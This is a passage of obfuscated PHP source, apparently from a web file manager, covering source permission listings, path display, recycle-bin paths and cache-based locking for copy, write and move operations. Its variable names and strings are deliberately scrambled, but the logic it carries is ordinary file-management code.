array(); foreach ($›ÄõÓÄ as $©É×) { if ($©É×[$Îò¹áì[200]] == self::TYPE_GROUP) { $ÌÒ¨áô˜[] = $©É×[$Îò¹áì[203]]; } } if (!$ÌÒ¨áô˜) { return; } $éÆµ×çæ = array_to_keyvalue($›ÄõÓÄ, $Îò¹áì[203]); $¨¦ÑÁ« = Model($Îò¹áì[578])->getSourceList($ÌÒ¨áô˜, $éÆµ×çæ); $²ÜÅ¸Ë = KodUser::isRoot(); foreach ($›ÄõÓÄ as $†¦æÃ°ï => &$©É×) { $©É×[$Îò¹áì[498]] = $¨¦ÑÁ«[$©É×[$Îò¹áì[203]]]; if (!$©É×[$Îò¹áì[498]] && $©É×[$Îò¹áì[200]] == self::TYPE_GROUP) { $©É×[$Îò¹áì[498]] = Action($Îò¹áì[579])->pathGroupAuthMake($©É×[$Îò¹áì[580]]); if (!$©É×[$Îò¹áì[498]] && !$²ÜÅ¸Ë) { $©É×[$Îò¹áì[245]] = !1; $©É×[$Îò¹áì[244]] = !1; } } if ($©É×[$Îò¹áì[498]]) { $©É×[$Îò¹áì[245]] = AuthModel::authCheckEdit($©É×[$Îò¹áì[498]][$Îò¹áì[499]]); $©É×[$Îò¹áì[244]] = AuthModel::authCheckView($©É×[$Îò¹áì[498]][$Îò¹áì[499]]); } $this->groupPathDisplay($©É×); } unset($©É×); } public function _listAppendAuthSecret(&$½—ç°›”) { $á‹ÀøÚ =& $_SERVER[¼èá¯æÙ]; if (Model($á‹ÀøÚ[519])->get($á‹ÀøÚ[581]) != $á‹ÀøÚ[101]) { return; } static $¦„©»Øï = false; if (!$¦„©»Øï) { $¹ùöÊ¹  = Model($á‹ÀøÚ[582]); $ôû¤§îÃ = Model($á‹ÀøÚ[583]); $¦„©»Øï = $ôû¤§îÃ->listData(); $¦„©»Øï = array_to_keyvalue($¦„©»Øï, $á‹ÀøÚ[203]); $±¦ËÆÒæ = json_decode(Model($á‹ÀøÚ[519])->get($á‹ÀøÚ[584]), !0); $±¦ËÆÒæ = array_to_keyvalue($±¦ËÆÒæ, $á‹ÀøÚ[486]); foreach ($¦„©»Øï as $¨¶®éã => $Ó–íË»‘) { $ŞéÏÏ‘ = $±¦ËÆÒæ[$Ó–íË»‘[$á‹ÀøÚ[585]]]; if (!$ŞéÏÏ‘) { $ôû¤§îÃ->remove($Ó–íË»‘[$á‹ÀøÚ[486]]); unset($¦„©»Øï[$¨¶®éã]); continue; } $¿¾Ú¼¿ = $¹ùöÊ¹ ->listData($ŞéÏÏ‘[$á‹ÀøÚ[498]]); if (!$¿¾Ú¼¿) { $ôû¤§îÃ->remove($Ó–íË»‘[$á‹ÀøÚ[486]]); unset($¦„©»Øï[$¨¶®éã]); continue; } $Ó–íË»‘[$á‹ÀøÚ[498]] = $¿¾Ú¼¿; $Ó–íË»‘[$á‹ÀøÚ[586]] = $ŞéÏÏ‘; $Ó–íË»‘[$á‹ÀøÚ[587]] = Model($á‹ÀøÚ[588])->getInfoSimpleOuter($Ó–íË»‘[$á‹ÀøÚ[538]]); $¦„©»Øï[$¨¶®éã] = $Ó–íË»‘; } } $ÛÕÌË…¡ = USER_ID; $àÜ”‹‚§ = array(); $Ó³’ñâ = $this->_listAppendPath($àÜ”‹‚§, !0); foreach ($½—ç°›” as $¨¶®éã => &$Ó–íË»‘) { if (!is_array($Ó–íË»‘[$á‹ÀøÚ[498]])) { continue; } if ($Ó–íË»‘[$á‹ÀøÚ[200]] != $á‹ÀøÚ[589]) { continue; } if (isset($¦„©»Øï[$Ó–íË»‘[$á‹ÀøÚ[203]]])) { $ÇŒşˆî© = $¦„©»Øï[$Ó–íË»‘[$á‹ÀøÚ[203]]]; if (!is_array($Ó–íË»‘[$á‹ÀøÚ[550]])) { $Ó–íË»‘[$á‹ÀøÚ[550]] = array(); } $Ó–íË»‘[$á‹ÀøÚ[550]][$á‹ÀøÚ[590]] = $ÇŒşˆî©[$á‹ÀøÚ[585]]; $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[591]] = $ÇŒşˆî©; $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[592]] = $Ó–íË»‘[$á‹ÀøÚ[593]]; $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[594]] = $á‹ÀøÚ[101]; if ($ÇŒşˆî©[$á‹ÀøÚ[538]] != $ÛÕÌË…¡) { $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[499]] = $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[499]] & $ÇŒşˆî©[$á‹ÀøÚ[498]][$á‹ÀøÚ[498]]; } continue; } $áµ×ì£ = $this->parentLevelArray($Ó–íË»‘[$á‹ÀøÚ[595]]); $­Ç¥ƒæ– = array_reverse($áµ×ì£); foreach ($­Ç¥ƒæ– as $­û»ßÃ => $˜Òæ¬ğ) { if (!isset($¦„©»Øï[$˜Òæ¬ğ])) { continue; } $ÇŒşˆî© = $¦„©»Øï[$˜Òæ¬ğ]; $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[591]] = $ÇŒşˆî©; if ($ÇŒşˆî©[$á‹ÀøÚ[538]] != $ÛÕÌË…¡) { $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[499]] = $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[499]] & $ÇŒşˆî©[$á‹ÀøÚ[498]][$á‹ÀøÚ[498]]; } $Ø«‘Ú×Û = $á‹ÀøÚ[12]; $ƒûí“ì‘ = count($áµ×ì£) - $­û»ßÃ; for ($õªÖµ“¢ = 0; $õªÖµ“¢ < $ƒûí“ì‘; $õªÖµ“¢++) { if (!isset($Ó³’ñâ[$áµ×ì£[$õªÖµ“¢]])) { $Ø«‘Ú×Û = $á‹ÀøÚ[12]; break; } $Ø«‘Ú×Û = $Ø«‘Ú×Û . rtrim($Ó³’ñâ[$áµ×ì£[$õªÖµ“¢]], $á‹ÀøÚ[8]) . $á‹ÀøÚ[8]; } $Ó–íË»‘[$á‹ÀøÚ[498]][$á‹ÀøÚ[592]] = rtrim($Ø«‘Ú×Û, $á‹ÀøÚ[8]) . $á‹ÀøÚ[8]; break; } } unset($Ó–íË»‘); } public function groupPathDisplay(&$àÂ¹šÎá) { $…¸ï™æ =& $_SERVER[¼èá¯æÙ]; if ($àÂ¹šÎá[$…¸ï™æ[200]] != self::TYPE_GROUP) { return; } $²ó‘Ğú = Model($…¸ï™æ[596])->getInfo($àÂ¹šÎá[$…¸ï™æ[580]]); $¹ñíêÉÆ = $this->parentLevelArray($²ó‘Ğú[$…¸ï™æ[595]]); $¸Ö§Ú¿è = $…¸ï™æ[12]; foreach ($¹ñíêÉÆ as $Ûû™ÆµÄ) { $Ÿ–÷Ñ› = Model($…¸ï™æ[596])->getInfo($Ûû™ÆµÄ); $¸Ö§Ú¿è .= $Ÿ–÷Ñ›[$…¸ï™æ[100]][$…¸ï™æ[203]] . $…¸ï™æ[50]; } $àÂ¹šÎá[$…¸ï™æ[597]] = $²ó‘Ğú[$…¸ï™æ[202]]; $àÂ¹šÎá[$…¸ï™æ[598]] = $²ó‘Ğú[$…¸ï™æ[595]]; $àÂ¹šÎá[$…¸ï™æ[599]] = $²ó‘Ğú[$…¸ï™æ[600]]; $àÂ¹šÎá[$…¸ï™æ[601]] = $¸Ö§Ú¿è . $²ó‘Ğú[$…¸ï™æ[100]][$…¸ï™æ[203]]; } protected function _listAppendPath(&$ºÂÈ“À¶, $ş¹ú—Ú¶ = false) { $®€ÂòÓİ =& $_SERVER[¼èá¯æÙ]; static $†’šõìã = array(); $¬ÕĞ‡Ì = array(); $®ıö…Ş» = array(); if ($ş¹ú—Ú¶) { return $†’šõìã; } foreach ($ºÂÈ“À¶ as &$ââÎ‹ù) { $°Ğ®Óì = $ââÎ‹ù[$®€ÂòÓİ[203]]; if ($ââÎ‹ù[$®€ÂòÓİ[496]] == $®€ÂòÓİ[101] && $ââÎ‹ù[$®€ÂòÓİ[202]] != 0) { $†’šõìã[$°Ğ®Óì] = $ââÎ‹ù[$®€ÂòÓİ[32]]; } if ($ââÎ‹ù[$®€ÂòÓİ[496]] == $®€ÂòÓİ[101] && $ââÎ‹ù[$®€ÂòÓİ[202]] == 0) { $†’šõìã[$°Ğ®Óì] = $this->_listAppendPathRoot($ââÎ‹ù, array()); } if (isset($®ıö…Ş»[$ââÎ‹ù[$®€ÂòÓİ[595]]])) { continue; } $®ıö…Ş»[$ââÎ‹ù[$®€ÂòÓİ[595]]] = !0; $ùÜÁíŠÙ = $this->parentLevelArray($ââÎ‹ù[$®€ÂòÓİ[595]]); foreach ($ùÜÁíŠÙ as $¼æöÆ¹Ë => $ğ˜ñİ¢í) { if (isset($†’šõìã[$ğ˜ñİ¢í])) { continue; } if ($¼æöÆ¹Ë == 0) { $†’šõìã[$ğ˜ñİ¢í] = $this->_listAppendPathRoot($ââÎ‹ù, $ùÜÁíŠÙ); } if ($¼æöÆ¹Ë != 0) { $¬ÕĞ‡Ì[] = $ğ˜ñİ¢í; } } } unset($ââÎ‹ù); $¬ÕĞ‡Ì = array_unique($¬ÕĞ‡Ì); if (count($¬ÕĞ‡Ì) > 0) { $®ÛÕãŠ = array($®€ÂòÓİ[502] => array($®€ÂòÓİ[503], $¬ÕĞ‡Ì)); if (count($¬ÕĞ‡Ì) == 1) { $½ŒÎ‘¸Û = $this->sourceInfo($¬ÕĞ‡Ì[0]); $—§üºÂ– = is_array($½ŒÎ‘¸Û) ? array($½ŒÎ‘¸Û) : !1; } else { $—§üºÂ– = $this->field($®€ÂòÓİ[602])->where($®ÛÕãŠ)->select(); } if (!$—§üºÂ–) { $—§üºÂ– = array(); } foreach ($—§üºÂ– as $åäÑÀ‹) { $†’šõìã[$åäÑÀ‹[$®€ÂòÓİ[203]]] = $åäÑÀ‹[$®€ÂòÓİ[32]]; } } $”êÆúŸğ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÓÄ¢úÆì = array(); foreach ($ºÂÈ“À¶ as &$ââÎ‹ù) { $÷²ÎèôÏ = $ââÎ‹ù[$®€ÂòÓİ[595]]; $´¸€àÖı = $®€ÂòÓİ[12]; if (isset($ÓÄ¢úÆì[$÷²ÎèôÏ])) { $´¸€àÖı = $ÓÄ¢úÆì[$÷²ÎèôÏ]; } else { $ùÜÁíŠÙ = $this->parentLevelArray($ââÎ‹ù[$®€ÂòÓİ[595]]); foreach ($ùÜÁíŠÙ as $¼æöÆ¹Ë => $ğ˜ñİ¢í) { if (isset($†’šõìã[$ğ˜ñİ¢í])) { $´¸€àÖı .= $†’šõìã[$ğ˜ñİ¢í] . $®€ÂòÓİ[8]; } } $ÓÄ¢úÆì[$÷²ÎèôÏ] = $´¸€àÖı; } $´¸€àÖı .= $ââÎ‹ù[$®€ÂòÓİ[32]]; if ($ââÎ‹ù[$®€ÂòÓİ[496]] == $®€ÂòÓİ[101]) { $´¸€àÖı .= $®€ÂòÓİ[8]; } $ââÎ‹ù[$®€ÂòÓİ[593]] = str_replace($®€ÂòÓİ[266], $®€ÂòÓİ[8], $´¸€àÖı); if ($ââÎ‹ù[$®€ÂòÓİ[202]] == $®€ÂòÓİ[240]) { $ââÎ‹ù[$®€ÂòÓİ[32]] = trim($†’šõìã[$ââÎ‹ù[$®€ÂòÓİ[203]]], $®€ÂòÓİ[8]); $ââÎ‹ù[$®€ÂòÓİ[593]] = $ââÎ‹ù[$®€ÂòÓİ[32]] . $®€ÂòÓİ[8]; } if (intval($ââÎ‹ù[$®€ÂòÓİ[200]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ââÎ‹ù, $ùÜÁíŠÙ, $”êÆúŸğ); } } unset($ââÎ‹ù); return $ºÂÈ“À¶; } private function _listAppendPathRecycle(&$ë°”«úÚ, $šû‹ÉñŠ, $øƒ€ğÅœ) { $£ï¨¤ƒ =& $_SERVER[¼èá¯æÙ]; if (!in_array($øƒ€ğÅœ, $šû‹ÉñŠ) && $ë°”«úÚ[$£ï¨¤ƒ[203]] != $øƒ€ğÅœ) { return; } $æ‘¨ı¨± = explode($£ï¨¤ƒ[8], trim($ë°”«úÚ[$£ï¨¤ƒ[593]], $£ï¨¤ƒ[8])); $ïèö§‰Ç = implode($£ï¨¤ƒ[8], array_slice($æ‘¨ı¨±, 2)); $ë°”«úÚ[$£ï¨¤ƒ[593]] = $£ï¨¤ƒ[8] . LNG($£ï¨¤ƒ[603]) . $£ï¨¤ƒ[8] . ltrim($ïèö§‰Ç, $£ï¨¤ƒ[8]); $ë°”«úÚ[$£ï¨¤ƒ[595]] = $£ï¨¤ƒ[604] . implode($£ï¨¤ƒ[50], array_slice($šû‹ÉñŠ, 1)) . $£ï¨¤ƒ[50]; if ($ë°”«úÚ[$£ï¨¤ƒ[203]] == $øƒ€ğÅœ) { $ë°”«úÚ[$£ï¨¤ƒ[595]] = $£ï¨¤ƒ[604]; $ë°”«úÚ[$£ï¨¤ƒ[202]] = $£ï¨¤ƒ[240]; $ë°”«úÚ[$£ï¨¤ƒ[32]] = LNG($£ï¨¤ƒ[603]); } $ë°”«úÚ[$£ï¨¤ƒ[605]] = $£ï¨¤ƒ[606]; } protected function _listAppendPathRoot(&$µœ÷ª¬, $¡²´Í•Š) { $­÷áßÛ =& $_SERVER[¼èá¯æÙ]; static $ˆµÁêƒ· = false; static $²¾‘õá˜ = false; $¥ÄÙ¹‰õ = $­÷áßÛ[12]; if ($µœ÷ª¬[$­÷áßÛ[200]] == self::TYPE_USER) { if ($µœ÷ª¬[$­÷áßÛ[580]] == USER_ID) { $¥ÄÙ¹‰õ = LNG($­÷áßÛ[607]); if ($ˆµÁêƒ· === !1) { $íÑÌ–Âä = Model($­÷áßÛ[608])->getInfoFull(USER_ID); $ˆµÁêƒ· = _get($íÑÌ–Âä, $­÷áßÛ[609], $­÷áßÛ[12]); } if ($²¾‘õá˜ === !1) { $íÑÌ–Âä = Model($­÷áßÛ[608])->getInfoFull(USER_ID); $²¾‘õá˜ = _get($íÑÌ–Âä, $­÷áßÛ[610], $­÷áßÛ[12]); } if ($¡²´Í•Š && $¡²´Í•Š[0] == $ˆµÁêƒ· || !$¡²´Í•Š && $µœ÷ª¬[$­÷áßÛ[203]] == $ˆµÁêƒ·) { $¥ÄÙ¹‰õ = LNG($­÷áßÛ[611]); $µœ÷ª¬[$­÷áßÛ[612]] = $­÷áßÛ[613]; } if ($¡²´Í•Š && $¡²´Í•Š[0] == $²¾‘õá˜ || !$¡²´Í•Š && $µœ÷ª¬[$­÷áßÛ[203]] == $²¾‘õá˜) { $¥ÄÙ¹‰õ = $¥ÄÙ¹‰õ . $­÷áßÛ[614] . LNG($­÷áßÛ[615]); } if (!$¡²´Í•Š) { $µœ÷ª¬[$­÷áßÛ[32]] = $¥ÄÙ¹‰õ; } } else { $íÑÌ–Âä = Model($­÷áßÛ[608])->getInfoFull($µœ÷ª¬[$­÷áßÛ[580]]); $ß³ÏÏÜ = _get($íÑÌ–Âä, $­÷áßÛ[610], $­÷áßÛ[12]); $µœ÷ª¬[$­÷áßÛ[616]] = Model($­÷áßÛ[588])->getInfoSimpleOuter($µœ÷ª¬[$­÷áßÛ[580]]); $¥ÄÙ¹‰õ = LNG($­÷áßÛ[617]) . $­÷áßÛ[186] . $µœ÷ª¬[$­÷áßÛ[616]][$­÷áßÛ[32]] . $­÷áßÛ[188]; if ($¡²´Í•Š && $¡²´Í•Š[0] == $ß³ÏÏÜ || !$¡²´Í•Š && $µœ÷ª¬[$­÷áßÛ[203]] == $ß³ÏÏÜ) { $¥ÄÙ¹‰õ = LNG($­÷áßÛ[617]) . $­÷áßÛ[618] . $µœ÷ª¬[$­÷áßÛ[616]][$­÷áßÛ[32]] . $­÷áßÛ[614] . LNG($­÷áßÛ[615]) . $­÷áßÛ[188]; } } } else { if ($µœ÷ª¬[$­÷áßÛ[200]] == self::TYPE_GROUP) { $¥äÙ€ƒç = Model($­÷áßÛ[596])->getInfoSimple($µœ÷ª¬[$­÷áßÛ[580]]); $¥ÄÙ¹‰õ = $¥äÙ€ƒç[$­÷áßÛ[32]]; } else { if ($µœ÷ª¬[$­÷áßÛ[200]] == self::TYPE_SYSTEM) { $¥ÄÙ¹‰õ = $­÷áßÛ[619]; } } } $¥ÄÙ¹‰õ = $¥ÄÙ¹‰õ ? $­÷áßÛ[8] . $¥ÄÙ¹‰õ . $­÷áßÛ[8] : $­÷áßÛ[8]; return $¥ÄÙ¹‰õ; } protected function _listAppendUser(&$¥¥œ¢ÅÌ) { $¡Ìê±®¨ =& $_SERVER[¼èá¯æÙ]; $ŒßŒ­çµ = array_to_keyvalue($¥¥œ¢ÅÌ, $¡Ìê±®¨[12], $¡Ìê±®¨[538]); $€¶ƒóê™ = array_to_keyvalue($¥¥œ¢ÅÌ, $¡Ìê±®¨[12], $¡Ìê±®¨[540]); $Ÿ£øÎ® = array_merge($ŒßŒ­çµ, $€¶ƒóê™); $¿†½¶¹» = Model($¡Ìê±®¨[608])->userListInfo($Ÿ£øÎ®); foreach ($¥¥œ¢ÅÌ as &$»Ì—èöú) { $Û¯›·é = $»Ì—èöú[$¡Ìê±®¨[538]]; $»Ì—èöú[$¡Ìê±®¨[538]] = $¿†½¶¹»[$Û¯›·é] ? $¿†½¶¹»[$Û¯›·é] : !1; $Û¯›·é = $»Ì—èöú[$¡Ìê±®¨[540]]; $»Ì—èöú[$¡Ìê±®¨[540]] = $¿†½¶¹»[$Û¯›·é] ? $¿†½¶¹»[$Û¯›·é] : !1; if (_get($»Ì—èöú, $¡Ìê±®¨[620], 0)) { $‘«Æ‡½í = $GLOBALS[$¡Ìê±®¨[6]][$¡Ìê±®¨[102]][$¡Ìê±®¨[621]]; if ($»Ì—èöú[$¡Ìê±®¨[550]][$¡Ìê±®¨[622]] <= time() - $‘«Æ‡½í) { $this->metaSet($»Ì—èöú[$¡Ìê±®¨[203]], $¡Ìê±®¨[623], null); $this->metaSet($»Ì—èöú[$¡Ìê±®¨[203]], $¡Ìê±®¨[622], null); unset($»Ì—èöú[$¡Ìê±®¨[550]][$¡Ìê±®¨[623]]); continue; } $˜¢±¾·û = $»Ì—èöú[$¡Ìê±®¨[550]][$¡Ìê±®¨[623]]; $»Ì—èöú[$¡Ìê±®¨[550]][$¡Ìê±®¨[624]] = Model($¡Ìê±®¨[608])->getInfoSimpleOuter($˜¢±¾·û); } } unset($»Ì—èöú); } public function parentLevelArray($ê‚¸˜â•) { $ÒÁ¡ã =& $_SERVER[¼èá¯æÙ]; $ê‚¸˜â• = explode($ÒÁ¡ã[50], trim($ê‚¸˜â•, $ÒÁ¡ã[50])); return array_remove_value($ê‚¸˜â•, $ÒÁ¡ã[240]); } public function listAll($¬Ô”¾¶™) { $Œ§àìø• =& $_SERVER[¼èá¯æÙ]; $ª–ùòŸÒ = $this->sourceInfo($¬Ô”¾¶™); $Í±ºı–ç = array($Œ§àìø•[625] => array($Œ§àìø•[626], $ª–ùòŸÒ[$Œ§àìø•[595]] . $¬Ô”¾¶™ . $Œ§àìø•[627]), $Œ§àìø•[628] => 0); $ïÆóñ  = $Œ§àìø•[629]; $ŸŒç¨¦Å = "\114\105\x46\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\157\137\146\x69\154\x65\x20\146\x69\x6c\145\x20\x6f\x6e\x20\x73\x6f\165\x72\143\145\56\x66\x69\x6c\x65\111\x44\x20\75\40\x66\151\154\145\56\x66\x69\x6c\145\111\104"; $ßïª×­Í = $this->alias($Œ§àìø•[530])->field($ïÆóñ )->where($Í±ºı–ç)->join($ŸŒç¨¦Å)->select(); $this->_listAppendAuth($ßïª×­Í); $this->_listAppendUser($ßïª×­Í); $this->_listAppendPath($ßïª×­Í); $ßïª×­Í = array_to_keyvalue($ßïª×­Í, $Œ§àìø•[203]); $ßÌÎş€† = "\x2f{$ª–ùòŸÒ[$Œ§àìø•[32]]}\57"; $ßÌÎş€† = $ßÌÎş€† == $Œ§àìø•[266] ? $Œ§àìø•[8] : $ßÌÎş€†; $³€±ÑùÏ = array(); foreach ($ßïª×­Í as $–ˆ¹ıò³ => $¥Öà“) { $ôøò©Òà = $this->parentLevelArray($¥Öà“[$Œ§àìø•[595]]); array_shift($ôøò©Òà); $Ñ ¤™ã´ = $ßÌÎş€†; for ($Ášè™¥ = 0; $Ášè™¥ < count($ôøò©Òà); $Ášè™¥++) { $Ñ ¤™ã´ .= $ßïª×­Í[$ôøò©Òà[$Ášè™¥]][$Œ§àìø•[32]] . $Œ§àìø•[8]; } $Ñ ¤™ã´ .= $¥Öà“[$Œ§àìø•[32]]; if ($¥Öà“[$Œ§àìø•[496]]) { $Ñ ¤™ã´ .= $Œ§àìø•[8]; } $€Ìº§  = array($Œ§àìø•[506] => str_replace($Œ§àìø•[266], $Œ§àìø•[8], str_replace($Œ§àìø•[266], $Œ§àìø•[8], str_replace($Œ§àìø•[266], $Œ§àìø•[8], $Ñ ¤™ã´))), $Œ§àìø•[630] => intval($¥Öà“[$Œ§àìø•[496]]), $Œ§àìø•[631] => intval($¥Öà“[$Œ§àìø•[89]]), $Œ§àìø•[98] => intval($¥Öà“[$Œ§àìø•[98]]), $Œ§àìø•[100] => $this->pathInfoFilter($¥Öà“)); if (!$€Ìº§ [$Œ§àìø•[496]]) { $€Ìº§ [$Œ§àìø•[552]] = $¥Öà“[$Œ§àìø•[552]]; } $³€±ÑùÏ[] = $€Ìº§ ; } $³€±ÑùÏ = array_sort_by($³€±ÑùÏ, $Œ§àìø•[97]); return $³€±ÑùÏ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($¶Ğ©ÄË‘) { $æœ¹Õ¬È =& $_SERVER[¼èá¯æÙ]; if (!$this->allowLock()) { return; } $this->_lockCheck($æœ¹Õ¬È[632], $¶Ğ©ÄË‘); $ØõÎü­ó = 1; $this->_lockEvent($¶Ğ©ÄË‘, array($æœ¹Õ¬È[633], $æœ¹Õ¬È[634]), $ØõÎü­ó); $this->_lockParent($¶Ğ©ÄË‘, array($æœ¹Õ¬È[634]), $ØõÎü­ó); $this->_lockEvent($¶Ğ©ÄË‘, array($æœ¹Õ¬È[635], $æœ¹Õ¬È[636]), $ØõÎü­ó); $this->_lockCheckEnd($æœ¹Õ¬È[632], $¶Ğ©ÄË‘); } public function lockCopyEnd($ÜØæºõÂ) { $ËÍÕÌÅÒ =& $_SERVER[¼èá¯æÙ]; if (!$this->allowLock()) { return; } $­Òüü»· = 0; $this->_lockEvent($ÜØæºõÂ, array($ËÍÕÌÅÒ[633], $ËÍÕÌÅÒ[634]), $­Òüü»·); $this->_lockParent($ÜØæºõÂ, array($ËÍÕÌÅÒ[634]), $­Òüü»·); $this->_lockEvent($ÜØæºõÂ, array($ËÍÕÌÅÒ[635], $ËÍÕÌÅÒ[636]), $­Òüü»·); } public function lockWriteStart($®äª¨ø­, $ù§ò˜¬ò = '') { $†ª´àÜÀ =& $_SERVER[¼èá¯æÙ]; if (!$this->allowLock()) { return; } $this->_lockCheck($†ª´àÜÀ[633], $®äª¨ø­); $»Ô¡Ş‡ü = 1; $this->_lockKey($†ª´àÜÀ[637] . $®äª¨ø­ . $†ª´àÜÀ[10] . $ù§ò˜¬ò, $»Ô¡Ş‡ü); $this->_lockEvent($®äª¨ø­, array($†ª´àÜÀ[632], $†ª´àÜÀ[634]), $»Ô¡Ş‡ü); $this->_lockParent($®äª¨ø­, array($†ª´àÜÀ[632], $†ª´àÜÀ[634]), $»Ô¡Ş‡ü); $this->_lockCheckEnd($†ª´àÜÀ[633], $®äª¨ø­); } public function lockWriteEnd($õê­§ºÅ, $Ä†æ¹õÃ = '') { $§Ÿ…¼Ìµ =& $_SERVER[¼èá¯æÙ]; if (!$this->allowLock()) { return; } $ÏŞÇÓ„Ì = 0; $this->_lockKey($§Ÿ…¼Ìµ[637] . $õê­§ºÅ . $§Ÿ…¼Ìµ[10] . $Ä†æ¹õÃ, $ÏŞÇÓ„Ì); $this->_lockEvent($õê­§ºÅ, array($§Ÿ…¼Ìµ[632], $§Ÿ…¼Ìµ[634]), $ÏŞÇÓ„Ì); $this->_lockParent($õê­§ºÅ, array($§Ÿ…¼Ìµ[632], $§Ÿ…¼Ìµ[634]), $ÏŞÇÓ„Ì); } public function lockMoveStart($º€ğÇ ˜) { $Ã®äöëÕ =& $_SERVER[¼èá¯æÙ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Ã®äöëÕ[634], $º€ğÇ ˜); $ßÊëÙÎ = 1; $this->_lockKey($Ã®äöëÕ[638] . $º€ğÇ ˜, $ßÊëÙÎ); $this->_lockEvent($º€ğÇ ˜, array($Ã®äöëÕ[632], $Ã®äöëÕ[633]), $ßÊëÙÎ); $this->_lockParent($º€ğÇ ˜, array($Ã®äöëÕ[632], $Ã®äöëÕ[634]), $ßÊëÙÎ); $this->_lockEvent($º€ğÇ ˜, array($Ã®äöëÕ[639], $Ã®äöëÕ[635], $Ã®äöëÕ[636]), $ßÊëÙÎ); $this->_lockCheckEnd($Ã®äöëÕ[634], $º€ğÇ ˜); } public function lockMoveEnd($Á¶ÙŸì×) { $¦Ë…÷ë£ =& $_SERVER[¼èá¯æÙ]; if (!$this->allowLock()) { return; } $Ã÷”ÆÎİ = 0; $this->_lockKey($¦Ë…÷ë£[638] . $Á¶ÙŸì×, $Ã÷”ÆÎİ); $this->_lockEvent($Á¶ÙŸì×, array($¦Ë…÷ë£[632], $¦Ë…÷ë£[633]), $Ã÷”ÆÎİ); $this->_lockParent($Á¶ÙŸì×, array($¦Ë…÷ë£[632], $¦Ë…÷ë£[634]), $Ã÷”ÆÎİ); $this->_lockEvent($Á¶ÙŸì×, array($¦Ë…÷ë£[639], $¦Ë…÷ë£[635], $¦Ë…÷ë£[636]), $Ã÷”ÆÎİ); } private function _lockCheck($ôä‘‰µ, $çå®ª­) { $¸§ƒ¯•” =& $_SERVER[¼èá¯æÙ]; $°ˆàïÖ¿ = $this->sourceInfo($çå®ª­); $º‰¼Ô¾´ = $ôä‘‰µ . $¸§ƒ¯•”[10] . $çå®ª­; $this->_lockTimeStart[$º‰¼Ô¾´] = timeFloat(); if (!is_array($°ˆàïÖ¿)) { return; } $€„Ş›İ = LNG($¸§ƒ¯•”[640]); CacheLock::setErrorMsg($¸§ƒ¯•”[186] . htmlspecialchars($°ˆàïÖ¿[$¸§ƒ¯•”[32]]) . $¸§ƒ¯•”[188] . $€„Ş›İ); $this->_lockKey($º‰¼Ô¾´, 1); $this->_lockKey($º‰¼Ô¾´, 0); $‡ğóªÌ– = array_reverse($this->parentLevelArray($°ˆàïÖ¿[$¸§ƒ¯•”[595]])); foreach ($‡ğóªÌ– as $…ºÏ’Š) { $º‰¼Ô¾´ = $ôä‘‰µ . $¸§ƒ¯•”[641] . $…ºÏ’Š; if (CacheLock::lockGet($¸§ƒ¯•”[642] . $º‰¼Ô¾´)) { $°ˆàïÖ¿ = $this->sourceInfo($…ºÏ’Š); CacheLock::setErrorMsg($¸§ƒ¯•”[186] . htmlspecialchars($°ˆàïÖ¿[$¸§ƒ¯•”[32]]) . $¸§ƒ¯•”[188] . $€„Ş›İ); $this->_lockKey($º‰¼Ô¾´, 1); $this->_lockKey($º‰¼Ô¾´, 0); } } } private function _lockCheckEnd($Ãûª«Ş, $©¡ßå…Ì) { $æØô¼Ïş =& $_SERVER[¼èá¯æÙ]; $Ú·«ú’‹ = $Ãûª«Ş . $æØô¼Ïş[10] . $©¡ßå…Ì; CacheLock::setErrorMsg($æØô¼Ïş[63]); if (!isset($this->_lockTimeStart[$Ú·«ú’‹])) { return; } $ğ­ÚÁÊš = timeFloat() - $this->_lockTimeStart[$Ú·«ú’‹]; unset($this->_lockTimeStart[$Ú·«ú’‹]); if ($ğ­ÚÁÊš > 0.5) { unset(self::$cacheSourceInfo[$æØô¼Ïş[544] . $©¡ßå…Ì]); } $÷„ĞĞ = $this->sourceInfo($©¡ßå…Ì); if (!$÷„ĞĞ) { show_json(LNG($æØô¼Ïş[118]), !1); } } private function _lockParent($éƒøòÇ¡, $£ĞÛ·€Ä, $Àğ¦‰Úß) { if (!$this->autoLockSet) { return; } $Ûº°—‚ = $this->sourceInfo($éƒøòÇ¡); if (!is_array($Ûº°—‚)) { return; } $«Ì§İ«¶ = array_reverse($this->parentLevelArray($Ûº°—‚[$_SERVER[¼èá¯æÙ][595]])); foreach ($«Ì§İ«¶ as $••ÌÕ“Ò) { $this->_lockEvent($••ÌÕ“Ò, $£ĞÛ·€Ä, $Àğ¦‰Úß); } } private function _lockEvent($‹™ÁÃÛŒ, $£®Ëœ»ü, $«Ö§®›û) { $´”×ÒÈ× =& $_SERVER[¼èá¯æÙ]; if (!$this->autoLockSet) { return; } foreach ($£®Ëœ»ü as $ßŞàÏØÅ) { $ÙáÂô« = $ßŞàÏØÅ . $´”×ÒÈ×[10] . $‹™ÁÃÛŒ; if ($«Ö§®›û && CacheLock::lockGet($´”×ÒÈ×[642] . $ÙáÂô«)) { continue; } $this->_lockKey($ÙáÂô«, $«Ö§®›û); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($²§³úú², $´³Š¤ş´ = 1) { $‚°²”Ø‹ = $_SERVER[¼èá¯æÙ][642] . md5($²§³úú²); if ($´³Š¤ş´) { if (isset(self::$_lockItemArr[$‚°²”Ø‹])) { return; } self::$_lockItemArr[$‚°²”Ø‹] = 1; CacheLock::lock($‚°²”Ø‹, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‚°²”Ø‹])) { return; } unset(self::$_lockItemArr[$‚°²”Ø‹]); CacheLock::unlock($‚°²”Ø‹); } } 